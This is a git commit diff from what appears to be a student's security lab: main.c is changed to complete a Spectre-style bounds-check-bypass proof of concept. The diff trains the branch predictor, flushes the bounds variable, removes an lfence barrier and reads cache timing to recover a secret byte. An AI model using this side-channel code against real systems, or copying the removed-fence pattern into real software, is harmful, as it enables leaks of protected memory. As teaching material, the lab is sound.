7ab798555928dc06fab0540258e1ad4777c398d7
Mathew Luo <luomathew@gmail.com>
2024-10-31 00:50:37 -0700

    Finished lab!

--- main.c
+++ main.c
@@ -22,8 +22,12 @@ int probe(void *huge_page) {
 		times[i] = measure_one_block_access_time((uint64_t)((uint8_t *)huge_page + STRIDE*i + OFFSET));
 	}
 	int secret = 0;
-	for (int i=0; i<=47; i++) {
-		printf("index %d: %d\n", i, times[i]);
+	for (int i=0; i<100; i++) {
+		printf("load_time(%d): %d", i, times[i]);
+		if (times[i] < 50) {
+			printf(" - SECRET VALUE!");
+		}
+		printf("\n");
 	}
 	return secret;
 }
@@ -32,20 +36,17 @@ int probe(void *huge_page) {
 // Assume secret_array[47] is your secret value
 // Assume the bounds check bypass prevents you from loading values above 20
 // Use a secondary load instruction (as shown in pseudo-code) to convert secret value to address
+static uint8_t bounds_check = 20;  
 uint8_t victim(void *huge_page, int index) {
 	// Assume the first 100 values of the hugepage are allocated as the secret array
 	uint8_t *secret_array = (uint8_t *)huge_page;
-	uint8_t bounds_check = 20;
+	int secondary_index = STRIDE*secret_array[index] + OFFSET;
 	clflush(&bounds_check);
 
-	int secondary_index = STRIDE*secret_array[index] + OFFSET;
-	lfence();
-	uint8_t temp = bounds_check;
-	if (index <= temp) {
+	if (index <= bounds_check) {
 		uint8_t v = secret_array[secondary_index];
-		return v;
 	}
-	return -1;
+	return 0;
 }
 
 int main(int argc, char **argv)
@@ -64,7 +65,7 @@ int main(int argc, char **argv)
     // Thus, we use a dummy write here to trigger page allocation
     // so later access will not suffer from such overhead.
     *((char *)huge_page) = 1; // dummy write to trigger page allocation
-
+	flush_cache(huge_page);
 
     //** STEP 1: Allocate an array into the mmap */
     uint8_t *secret_array = (uint8_t *)huge_page;
@@ -76,9 +77,10 @@ int main(int argc, char **argv)
 
     //** STEP 2: Mistrain the branch predictor by calling victim function here */
     // To prevent any kind of patterns, ensure each time you train it a different number of times
-	int num_train = rand() % 50 + 100;
-	for (int i=0; i < num_train; i++) {
-		victim(huge_page, 15);
+	// int num_train = rand() % 20 + 20;
+	for (int i=0; i<30; i++) {
+		int index = rand() % 10 + 10;
+		victim(huge_page, index);
 	}
 
     //** STEP 3: Clear cache using clflsuh from utility.h */
@@ -86,15 +88,8 @@ int main(int argc, char **argv)
 
     //** STEP 4: Call victim function again with bounds bypass value */
 	victim(huge_page, SECRET);
-	victim(huge_page, SECRET);
-	victim(huge_page, SECRET);
 
     //** STEP 5: Reload mmap to see load times */
-    // Just read the mmap's first 100 integers
-	// int secondary_index = STRIDE*secret_array[SECRET] + OFFSET;
-	// int v = secret_array[secondary_index];
-	// int mysecret = probe(huge_page);
-	// printf("Secret value: %d\n", mysecret);
 	probe(huge_page);
     return 0;
 }
